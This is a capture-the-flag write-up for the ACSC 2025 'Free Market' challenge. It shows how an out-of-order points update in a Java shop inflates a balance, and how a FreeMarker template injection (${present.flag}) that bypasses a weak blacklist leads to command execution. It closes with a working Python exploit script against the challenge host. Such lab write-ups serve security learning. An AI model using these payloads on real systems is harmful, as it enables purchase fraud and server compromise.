# Write-up: Free Market (ACSC 2025)

The challenge requires chaining two vulnerabilities: a **Business Logic Flaw** to manipulate the account balance and a **Server-Side Template Injection (SSTI)** to achieve RCE and retrieve the flag.

---
### Attack Vector 1: Business Logic Flaw (State Inconsistency)
* **Root Cause:**
    In `ShopController.java`, the logic for updating reward points executes out of order. The application calculates the new points and commits them to the session via `s.setAttribute("points", ...)` **before** the final payment validation check (Check 2) is evaluated.
    ```java
    int balance = ((Integer)Optional.<Integer>ofNullable((Integer)s.getAttribute("balance")).orElse(Integer.valueOf(100000))).intValue();
    int oldPoints = ((Integer)Optional.<Integer>ofNullable((Integer)s.getAttribute("points")).orElse(Integer.valueOf(0))).intValue();
    if (balance + oldPoints < price.intValue()) {
        return "redirect:/images/hehe.png";
    }
    int usePoints = ((Integer)Optional.<Integer>ofNullable(sp).orElse(Integer.valueOf(oldPoints))).intValue();
    usePoints = Math.max(0, Math.min(usePoints, oldPoints));
    
    int points = oldPoints + price.intValue();
    s.setAttribute("points", Integer.valueOf(points));
    
    if (balance + usePoints < price.intValue()) {
      return "redirect:/images/hehe.png";
    }
    
    if (balance >= price.intValue()) {
      balance -= price.intValue();
    } else {
      int need = price.intValue() - balance;
      balance = 0;
      points -= need;
    } 
    ```
* **Proof of Concept (PoC):**
    1. Initial account state: Balance = 100k, Points = 0.
    2. Purchase Item 5 (80k) -> Balance = 20k, Points = 80k.
    3. Attempt to purchase Item 5 again, but force it to not use points: `/purchase?id=5&_=0`.
        * Passes Check 1: `Balance (20k) + oldPoints (80k) >= 80k`.
        * Inflates points: `Points = 80k + 80k = 160k` (Committed to session).
        * Fails Check 2: `Balance (20k) + usePoints (0) < 80k` -> Transaction aborted.
    4. Current state: Balance = 20k, Points = 160k. Total purchasing power = 180k. This is sufficient to buy Item 6 (FLAG, 110k) and unlock the `/gift` endpoint.
---
### Attack Vector 2: Server-Side Template Injection (SSTI)
* **Root Cause:**
    The `/gift` endpoint previews messages using FreeMarker. Although a Regex WAF is present, it uses a weak blacklist that fails to filter the `${...}` syntax. Additionally, the application explicitly injects a `Present` object into the Model (`m.addAttribute("present", new Present());`). In FreeMarker, accessing a property via `${object.property}` implicitly invokes the underlying getter method (`getProperty()`).
    ```java
    Template t = new Template("giftPreview", message, FreemarkerConfig.getConfiguration());
    String rendered = FreeMarkerTemplateUtils.processTemplateIntoString(t, m.asMap());
    ```
* **Proof of Concept (PoC):**
    Send the payload `${present.flag}` via the `message` parameter. FreeMarker parses the syntax and implicitly calls `Present.getFlag()`, which executes the system command `Runtime.getRuntime().exec("cat /flag")` and reflects the output in the response.
    ```java
    process = Runtime.getRuntime().exec("cat /flag");
    InputStream is = process.getInputStream();
    ```
---
### Exploit Script (Python)

```python
import requests

url = "http://host8.dreamhack.games:19619"

s = requests.Session()
r = s.get(url + "/purchase?id=5")
r = s.get(url + "/purchase?id=5&_=0")
r = s.get(url + "/purchase?id=6")
print("SSTI")
payload = {
    "message": "${present.flag}"
}
r = s.post(f"{url}/gift", data=payload)
print(r.text)

```
